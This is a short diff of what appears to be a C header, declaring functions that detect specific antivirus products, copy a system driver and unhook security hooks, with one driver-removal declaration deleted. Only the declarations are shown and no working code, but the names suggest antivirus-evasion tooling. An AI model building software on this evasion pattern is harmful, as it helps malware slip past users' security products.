@@ -28,7 +28,6 @@ BOOL IsNortonInternetSecurity();
 BOOL IsKaspersky();
 BOOL IsKerio();
 BOOL CopySystemDriver(WCHAR* drv_path);
-BOOL RemoveSystemDriver();
 BOOL IsGData();
 BOOL IsBlackList();
 BOOL doUnhook();
